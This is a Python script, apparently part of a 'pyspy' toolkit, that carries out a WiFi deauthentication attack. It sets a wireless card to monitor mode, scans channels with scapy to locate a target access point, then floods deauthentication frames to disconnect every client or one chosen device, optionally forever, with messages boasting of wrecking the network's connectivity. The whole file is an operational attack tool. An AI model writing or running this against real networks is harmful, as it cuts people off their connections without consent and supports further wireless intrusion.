#!/usr/bin/python3

# Imports for libraries
# from socket import timeout
from pyspy.attacks import deauth
from pyspy.callbacks import get_hostnames, getDF
from pyspy.config import interface, get_deauth_args, get_interfaces, banner, get_2ghz_channels, get_5ghz_channels, get_channels
from pyspy.config import print_warning, print_update, print_good
from scapy import *
from scapy.all import *


def deauthenticate(arguments):
    # Checks if a channel interface is passed
    # If it is set the interface to that adapter
    # If not get the interface automatically
    if arguments.interface:
        current_interface = interface(arguments.interface)
    else:
        try:
            current_interface = interface(get_interfaces()[1])
        except Exception as e:
            print_warning("[+] Error: No external WiFi card present.")
            print_warning("[+] If you don't have a built in wifi card then please specify the specific wifi card")
            return -1
            
    if arguments.frequency == 2:
        current_interface.set_channel_range(get_2ghz_channels())
    elif arguments.frequency == 5:
        current_interface.set_channel_range(get_5ghz_channels())
    else:
        current_interface.set_channel_range(get_channels())

    print_update(f"[+] The interface used for deauthentication is: {current_interface.name}")
    
    # Put the interface into monitor mode
    current_interface.set_monitor_mode()

    print_update(f"[+] {current_interface.name} has been set into monitor mode")
    
    # Gets the empty dataframe from the callback
    networks = getDF()
    
    if arguments.channel == None:
        # While the AP mac address isn't present keep searching
        print_update(f"[+] Beginning search for {arguments.bssid}")
        while(arguments.bssid not in networks.index):
            sniff(prn=get_hostnames, iface=current_interface.name, timeout=2)
            # Get the dataframe created by the call back
            networks = getDF()
            # increase the channel
            current_interface.increment_channel_manually()
        
        # Once the AP mac address is found get the channel
        channel_for_deauth = networks.loc[arguments.bssid, "Channel"]
    else:
        current_interface.change_channel(arguments.channel)
        # While the AP mac address isn't present keep searching
        print_update(f"[+] Beginning search for {arguments.bssid}")
        while(arguments.bssid not in networks.index):
            # Sniff 50 pcakets at a time
            sniff(prn=get_hostnames, iface=current_interface.name, timeout=2)
            # Get the dataframe created by the call back
            networks = getDF()
        channel_for_deauth = arguments.channel
    
    # Set the antena channel to that of the AP in order to deauth
    current_interface.change_channel(channel_for_deauth)
    
    print_warning("[+] You need to hit ctrl-c (multiple times) to exit")

    # Check if a destination mac was provided
    # If it was only deauth that device
    # Else disconnect all the things
    if arguments.destination_mac == None:
        if arguments.forever:
            print_update(f"[+] Sending Packets Forever!!! Screw the WIFI connectivity to all devices connected to: {networks.loc[arguments.bssid, 'SSID']}!!!")
            deauth(current_interface.name, 
                    arguments.bssid, 
                    forever=True)
        else:
            print_update(f"[+] Sending 2000 Packets!!! Screw the WIFI connectivity to all devices connected to: {networks.loc[arguments.bssid, 'SSID']}!!!")
            deauth(current_interface.name, 
                    arguments.bssid)
    else:
        if arguments.forever:
            print_update(f"[+] Sending Packets Forever!!! Screw the WIFI connectivity to {arguments.destination_mac}!!!")
            deauth(current_interface.name, 
                    arguments.bssid,
                    arguments.destination_mac,  
                    forever=True)
        else:
            print_update(f"[+] Sending 2000 Packets!!! Screw the WIFI connectivity to {arguments.destination_mac}!!!")
            deauth(current_interface.name,  
                    arguments.bssid,
                    arguments.destination_mac)


# Start of the program
if __name__ == '__main__':
    # Gets arguments from the cli
    cli_arguments = get_deauth_args()
    if not cli_arguments.quiet:
        banner()
        print_good("[+] Begining deauthentication initialization sequence")
    if os.geteuid() == 0:
        deauthenticate(cli_arguments)
    else:
        print_warning("[+] This program must be ran as root!!!")
        